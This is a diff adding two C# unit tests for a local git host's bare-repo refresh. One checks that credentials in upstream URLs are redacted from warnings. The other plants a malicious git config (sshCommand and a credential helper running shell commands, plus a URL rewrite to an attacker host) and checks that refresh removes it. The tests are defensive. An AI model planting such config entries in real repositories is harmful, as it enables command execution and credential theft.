@@ -77,6 +77,62 @@ public sealed class LocalGitHostFetchRefreshTests : IDisposable
     }
 
     [Fact]
+    public async Task ExistingBareRepo_RefreshWarningRedactsUpstreamCredentials()
+    {
+        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
+        var logger = new CapturingLogger<LocalGitHost>();
+        var gitHost = CreateGitHost(logger);
+        var id = WorkItemId.New();
+
+        await gitHost.EnsureRepositoryAsync(id, seed, "main");
+
+        await gitHost.EnsureRepositoryAsync(id, "https://user:secret@127.0.0.1:1/repo.git", "main");
+
+        var warning = Assert.Single(logger.Entries, e => e.Level == LogLevel.Warning
+            && e.Message.Contains("Failed to refresh bare repo", StringComparison.Ordinal));
+        Assert.DoesNotContain("secret", warning.Message, StringComparison.Ordinal);
+        Assert.DoesNotContain("user:secret", warning.Message, StringComparison.Ordinal);
+        Assert.Contains("https://***@127.0.0.1", warning.Message, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task ExistingBareRepo_RefreshSanitizesSandboxWritableConfig()
+    {
+        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
+        var gitHost = CreateGitHost();
+        var id = WorkItemId.New();
+
+        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
+        var barePath = gitHost.GetRepoPath(repoId);
+        var marker = Path.Combine(_workspace, "malicious-config-ran");
+        await File.WriteAllTextAsync(
+            Path.Combine(barePath, "config"),
+            $$"""
+            [core]
+            	repositoryformatversion = 0
+            	filemode = true
+            	bare = true
+            	sshCommand = sh -c 'touch "{{marker}}"'
+            [credential]
+            	helper = !sh -c 'touch "{{marker}}"'
+            [url "ssh://attacker.invalid/"]
+            	insteadOf = {{seed}}
+            """);
+
+        await CommitToRepoAsync(seed, "after.txt", "after\n", "advance main");
+        var after = await RevParseAsync(seed, "main");
+
+        await gitHost.EnsureRepositoryAsync(id, seed, "main");
+
+        var refreshedConfig = await File.ReadAllTextAsync(Path.Combine(barePath, "config"));
+        Assert.Equal(after, await RevParseAsync(barePath, "main"));
+        Assert.False(File.Exists(marker));
+        Assert.DoesNotContain("sshCommand", refreshedConfig, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("credential", refreshedConfig, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("insteadOf", refreshedConfig, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
     public async Task ExistingBareRepo_NullSeedUrlIsNoOp()
     {
         var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
